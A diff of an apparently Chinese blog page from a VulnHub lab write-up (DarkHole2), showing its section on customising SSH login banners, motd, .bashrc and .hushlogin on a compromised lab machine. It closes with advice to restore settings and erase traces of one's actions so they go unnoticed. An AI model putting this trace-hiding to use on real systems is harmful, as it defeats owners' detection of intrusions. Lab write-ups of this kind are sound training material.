+<blockquote>
+<p>可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆前显示的，/etc/issue.net 的作用就是登陆前显示信息<br>
+将登陆后的信息也显示一下进行对比就更容易理解执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式</p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1237.png" alt></p>
-<p>/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后</p>
-<h3 id="一键关闭登陆前的信息展示"><a class="markdownIt-Anchor" href="#一键关闭登陆前的信息展示">#</a> 一键关闭登陆前的信息展示</h3>
-<p>sed -i ‘s/Banner /etc/issue.net/#Banner none/g’ /etc/ssh/sshd_config;systemctl<br>
-restart sshd;echo &gt; /etc/issue.net</p>
+<blockquote>
+<p>/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后<br>
+一键关闭登陆前的信息展示<br>
+ <code>sed -i 's/Banner \/etc\/issue.net/#Banner none/g' /etc/ssh/sshd_config;systemctl restart sshd;echo &gt; /etc/issue.net</code></p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1238.png" alt></p>
-<h3 id="除了上述几种方式外我们还可以添加自定义的语句到环境变量中登陆到"><a class="markdownIt-Anchor" href="#除了上述几种方式外我们还可以添加自定义的语句到环境变量中登陆到">#</a> 除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到</h3>
-<p>shell 后就会执行，比如在环境变量里边添加<br>
- figlet 表示以一种方式去打印后面跟的字母或者数字<br>
- cat &gt;&gt; ~/.bashrc &lt;&lt; EOF<br>
-figlet I’m X_T<br>
-EOF<br>
- 检查这个文件是否完整的写入到了环境变量里边<br>
- cat ~/.bashrc | tail -n1</p>
+<h3 id="ssh-自定义登录文字"><a class="markdownIt-Anchor" href="#ssh-自定义登录文字">#</a> ssh 自定义登录文字</h3>
+<blockquote>
+<p>除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到 shell 后就会执行</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在环境变量里边添加figlet表示以一种方式去打印后面跟的字母或者数字</span></span><br><span class="line">cat &gt;&gt; ~/.bashrc &lt;&lt; EOF</span><br><span class="line">figlet I\&#x27;m X_T</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查这个文件是否完整的写入到了环境变量里边</span></span><br><span class="line">cat ~/.bashrc | tail -n1</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-1239.png" alt></p>
 <p>vim ~/.bashrcs 删除此条信息则不会在显示这条</p>
-<h3 id="如果显示的信息太多了影响视觉有没有办法一键全部删除掉答案是肯定"><a class="markdownIt-Anchor" href="#如果显示的信息太多了影响视觉有没有办法一键全部删除掉答案是肯定">#</a> 如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定</h3>
-<p>的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都<br>
-再不会被显示出来<br>
- for USER in  <code>cat /etc/passwd | grep /bin/bash |grep -v root | cut -d &quot;:&quot; -f 1</code>  ;do touch<br>
-/home/$USER/.hushlogin;done;touch /root/.hushlogin</p>
+<h3 id="一键删除登录信息"><a class="markdownIt-Anchor" href="#一键删除登录信息">#</a> 一键删除登录信息</h3>
+<blockquote>
+<p>如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都再不会被显示出来<br>
+ for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do touch /home/$USER/.hushlogin;done;touch /root/.hushlogin</p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1240.png" alt></p>
-<h3 id="一键删除阻碍登陆日志信息输出的文件"><a class="markdownIt-Anchor" href="#一键删除阻碍登陆日志信息输出的文件">#</a> 一键删除阻碍登陆日志信息输出的文件：</h3>
-<p>for USER in  <code>cat /etc/passwd | grep /bin/bash |grep -v root | cut -d &quot;:&quot; -f 1</code>  ;do rm -f<br>
-/home/$USER/.hushlogin;done;rm -f /root/.hushlogin</p>
+<blockquote>
+<p>一键删除阻碍登陆日志信息输出的文件：<br>
+for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do rm -f /home/$USER/.hushlogin;done;rm -f /root/.hushlogin</p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1241.png" alt></p>
-<p>根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复<br>
-原，并且删除自己操作过的痕迹，防止被知道自己操作过什么</p>
+<p>根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复原，并且删除自己操作过的痕迹，防止被知道自己操作过什么。</p>
 
       <div class="tags">
           <a href="/tags/VULNHUB-41-50/" rel="tag"><i class="ic i-tag"></i> VULNHUB 41-50</a>
@@ -397,7 +374,7 @@ EOF<br>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-05 21:21:27" itemprop="dateModified" datetime="2023-07-05T21:21:27+08:00">2023-07-05</time>
+    <time title="修改时间：2023-07-06 18:49:39" itemprop="dateModified" datetime="2023-07-06T18:49:39+08:00">2023-07-06</time>
   </span>
   <span id="2021/11/01/VULNHUB/142 DARKHOLE2/" class="item leancloud_visitors" data-flag-title="VULNHUB 42 DARKHOLE2" title="阅读次数">
       <span class="icon">
@@ -460,20 +437,20 @@ EOF<br>
     <div class="item left">
       
 
-  <a href="/2021/11/01/VULNHUB/148%20GITROOT/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;ukLG5BwF6jH1ONA.jpg" title="VULNHUB 48 GITROOT">
+  <a href="/2021/11/01/VULNHUB/144%20CEREAL/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;NCQdhk8r9ybMEzq.jpg" title="VULNHUB 44 CEREAL">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 48 GITROOT</h3>
+  <h3>VULNHUB 44 CEREAL</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2021/11/01/VULNHUB/144%20CEREAL/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;MLkfsaNgvAjSFu2.jpg" title="VULNHUB 44 CEREAL">
+  <a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;HBF3Xx8TkufEAiz.jpg" title="VULNHUB 33 GROTESQUE3">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB 44 CEREAL</h3>
+  <h3>VULNHUB 33 GROTESQUE3</h3>
   </a>
 
     </div>
@@ -492,11 +469,11 @@ EOF<br>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%AF%B9%E5%85%B6%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BF%9B%E8%A1%8C%E8%AF%A6%E7%BB%86%E7%9A%84%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text"> 再次对其开放的端口进行详细的扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86git%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%88%A9%E7%94%A8git-log%E5%88%87%E6%8D%A2git%E5%88%86%E6%94%AF"><span class="toc-number">3.</span> <span class="toc-text"> 002 信息收集，.git 源码泄漏利用，git log 切换 git 分支</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E6%AC%A1%E5%AF%B9%E5%BE%97%E5%88%B0%E7%9A%84%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E6%90%9C%E7%B4%A2%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">4.</span> <span class="toc-text"> 依次对得到的目录信息进行访问搜索有价值的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-sql%E6%B3%A8%E5%85%A5%E6%8B%BF%E6%95%B0%E6%8D%AE-sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD-%E6%95%8F%E6%84%9F%E7%AB%AF%E5%8F%A3%E6%9F%A5%E7%9C%8B"><span class="toc-number">5.</span> <span class="toc-text"> 003 sql 注入拿数据、sqlmap 一把梭、敏感端口查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%BE%97%E5%88%B0%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E8%BF%9B%E5%85%A5%E5%88%B0%E4%BA%86%E5%AF%B9%E6%96%B9%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83"><span class="toc-number">6.</span> <span class="toc-text"> 通过得到的用户名和密码进入到了对方后台管理中心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-curl%E8%AE%BF%E9%97%AE%E7%BD%91%E7%AB%99%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-bash%E7%9A%84base-64-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">7.</span> <span class="toc-text"> 004 curl 访问网站及命令注入、bash 的 base 64 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%9C%A8%E8%BF%99%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%9C%89-9999-%E7%AB%AF%E5%8F%A3%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E4%BD%86%E6%98%AF%E6%AD%A4%E7%AB%AF%E5%8F%A3%E8%A2%AB%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E6%8E%89%E4%BA%86%E6%88%91%E4%BB%AC"><span class="toc-number">8.</span> <span class="toc-text"> 发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E7%9C%8B%E5%BD%93%E5%89%8D%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%98%AF%E5%B1%9E%E4%BA%8E%E5%93%AA%E4%B8%AA%E7%94%A8%E6%88%B7%E4%B8%8B%E7%9A%84"><span class="toc-number">9.</span> <span class="toc-text"> 执行系统命令，看当前这个网站是属于哪个用户下的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#005-pspy%E7%9B%91%E6%8E%A7-%E5%8E%86%E5%8F%B2%E9%81%97%E7%95%99%E4%BF%A1%E6%81%AF-%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text"> 005 pspy 监控、历史遗留信息、权限错误提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B1%E6%AD%A4%E9%80%A0%E6%88%90%E4%BA%86-9999-%E7%AB%AF%E5%8F%A3%E5%A4%84%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text"> 由此造成了 9999 端口处的命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#006-ssh%E7%99%BB%E9%99%86%E6%98%BE%E7%A4%BA%E4%BF%A1%E6%81%AF-%E7%99%BB%E9%99%86%E5%89%8D%E5%90%8E%E5%8F%8A%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF-lastlogin%E4%BF%A1%E6%81%AF"><span class="toc-number">12.</span> <span class="toc-text"> 006 ssh 登陆显示信息、登陆前后及系统信息、lastlogin 信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E9%BB%98%E8%AE%A4%E6%98%BE%E7%A4%BA%E7%9A%84%E4%BF%A1%E6%81%AF%E5%88%86%E4%BA%86%E4%B8%A4%E9%83%A8%E5%88%86%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%98%AF%E6%89%93%E5%8D%B0%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%98%AF%E6%9C%80%E5%90%8E"><span class="toc-number">13.</span> <span class="toc-text"> 这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%A1%E6%81%AF%E6%97%A0%E6%B3%95%E4%BF%AE%E6%94%B9%E5%93%AA%E6%80%95%E8%A2%AB%E6%B8%85%E7%A9%BA%E4%BA%86%E4%B9%9F%E4%BC%9A%E5%A4%8D%E5%8E%9F"><span class="toc-number">14.</span> <span class="toc-text"> 这个文件的信息无法修改，哪怕被清空了也会复原。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E4%B9%8B%E8%B5%8B%E4%BA%88%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E4%B9%8B%E5%90%8E%E5%8F%AF%E4%BB%A5%E6%98%BE%E7%A4%BA%E5%87%BA%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">15.</span> <span class="toc-text"> 反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%99%BB%E9%99%86%E7%9A%84%E6%B6%88%E6%81%AF%E4%B8%80%E8%88%AC%E6%9D%A5%E8%AF%B4%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E5%8F%AF%E4%BB%A5%E6%96%B9%E4%BE%BF%E7%9A%84%E7%9C%8B%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%9C%BA%E5%99%A8%E6%98%AF%E5%90%A6%E6%9C%89%E5%BC%82%E5%9C%B0%E7%99%BB"><span class="toc-number">16.</span> <span class="toc-text"> 最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%86%E7%9A%84%E6%83%85%E5%86%B5%E5%87%BA%E7%8E%B0%E5%BC%80%E5%90%AF%E6%9C%80%E5%90%8E%E7%99%BB%E9%99%86%E7%9A%84%E6%97%A5%E5%BF%97%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B"><span class="toc-number">17.</span> <span class="toc-text"> 陆的情况出现，开启最后登陆的日志命令如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%85%B3%E9%97%AD%E7%99%BB%E9%99%86%E5%89%8D%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B1%95%E7%A4%BA"><span class="toc-number">18.</span> <span class="toc-text"> 一键关闭登陆前的信息展示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%A4%E4%BA%86%E4%B8%8A%E8%BF%B0%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%A4%96%E6%88%91%E4%BB%AC%E8%BF%98%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E7%9A%84%E8%AF%AD%E5%8F%A5%E5%88%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%AD%E7%99%BB%E9%99%86%E5%88%B0"><span class="toc-number">19.</span> <span class="toc-text"> 除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%98%BE%E7%A4%BA%E7%9A%84%E4%BF%A1%E6%81%AF%E5%A4%AA%E5%A4%9A%E4%BA%86%E5%BD%B1%E5%93%8D%E8%A7%86%E8%A7%89%E6%9C%89%E6%B2%A1%E6%9C%89%E5%8A%9E%E6%B3%95%E4%B8%80%E9%94%AE%E5%85%A8%E9%83%A8%E5%88%A0%E9%99%A4%E6%8E%89%E7%AD%94%E6%A1%88%E6%98%AF%E8%82%AF%E5%AE%9A"><span class="toc-number">20.</span> <span class="toc-text"> 如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%88%A0%E9%99%A4%E9%98%BB%E7%A2%8D%E7%99%BB%E9%99%86%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E8%BE%93%E5%87%BA%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">21.</span> <span class="toc-text"> 一键删除阻碍登陆日志信息输出的文件：</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="toc-number">1.</span> <span class="toc-text"> 确认攻击目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 网站信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text"> .git 源码泄漏利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git-log%E5%88%87%E6%8D%A2git%E5%88%86%E6%94%AF"><span class="toc-number">4.</span> <span class="toc-text"> git log 切换 git 分支</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">5.</span> <span class="toc-text"> sqlmap 一把梭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-%E6%B5%8B%E8%AF%95%E7%BD%91%E7%AB%99"><span class="toc-number">6.</span> <span class="toc-text"> curl 测试网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E6%95%B4%E4%B8%BA%E6%A0%87%E5%87%86%E7%BB%88%E7%AB%AF"><span class="toc-number">7.</span> <span class="toc-text"> 调整为标准终端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E9%81%97%E7%95%99%E4%BF%A1%E6%81%AF"><span class="toc-number">8.</span> <span class="toc-text"> 历史遗留信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh-%E6%98%BE%E7%A4%BA%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">9.</span> <span class="toc-text"> ssh 显示系统信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh-%E6%9C%80%E5%90%8E%E7%99%BB%E5%BD%95ip"><span class="toc-number">10.</span> <span class="toc-text"> ssh 最后登录 ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh-%E7%99%BB%E5%BD%95%E6%97%B6logo"><span class="toc-number">11.</span> <span class="toc-text"> ssh 登录时 logo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh-%E8%87%AA%E5%AE%9A%E4%B9%89%E7%99%BB%E5%BD%95%E6%96%87%E5%AD%97"><span class="toc-number">12.</span> <span class="toc-text"> ssh 自定义登录文字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E5%88%A0%E9%99%A4%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">13.</span> <span class="toc-text"> 一键删除登录信息</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li class="active"><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li>
